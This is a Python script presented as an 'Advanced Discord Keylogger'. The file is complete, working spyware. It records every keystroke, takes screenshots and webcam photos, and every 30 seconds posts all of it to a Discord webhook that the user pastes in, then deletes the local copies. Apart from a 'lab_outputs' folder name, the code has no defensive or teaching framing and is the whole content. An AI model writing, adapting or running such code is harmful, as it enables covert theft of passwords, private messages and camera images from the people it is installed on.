#external libraries
from pynput import keyboard
import pyautogui
import cv2
import requests
import os
import time
import shutil

#Housekeeping
WEBHOOK_URL = "" #PASTE YOUR DISCORD WEBHOOK URL HERE
save_dir = "lab_outputs"
os.makedirs(save_dir, exist_ok=True)
KEYLOG_FILE = os.path.join(save_dir, "keylog.txt")

#Main Keystroke Logger Function
def on_press(key):
    try:
        k = key.char
    except:
        k = str(key)
    with open(KEYLOG_FILE, "a") as f:
        f.write(k)

listener = keyboard.Listener(on_press=on_press)
listener.start()

#Screenshot Function
def take_screenshot():
    filename = os.path.join(save_dir, "screenshot.png")
    pyautogui.screenshot().save(filename)
    return filename

#Webcam Capture Function
def take_camera_photo():
    filename = os.path.join(save_dir, "camera.png")
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(filename, frame)
    cap.release()
    return filename

#Send Media to Discord Webhook
def send_to_discord():
    #Read Keylogs
    keylog_data = ""
    if os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "r") as f:
            keylog_data = f.read()
        open(KEYLOG_FILE, "w").close()  # Clear after reading

    #Capture Media
    screenshot = take_screenshot()
    camera = take_camera_photo()
    media_files = [screenshot, camera]

    #send keylogs
    requests.post(WEBHOOK_URL, data={"content": f"# Keylogs:\n```{keylog_data}```"})

    #send images
    for f in media_files:
        with open(f, "rb") as file_obj:
            requests.post(WEBHOOK_URL, files={"file": file_obj})

    #Cleanup
    for f in os.listdir(save_dir):
        file_path = os.path.join(save_dir, f)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")
        
print("[*] Advanced Discord Keylogger is successfully running...")

while True:
    time.sleep(30)  # every 30 seconds it sends data to discord sever
    send_to_discord()

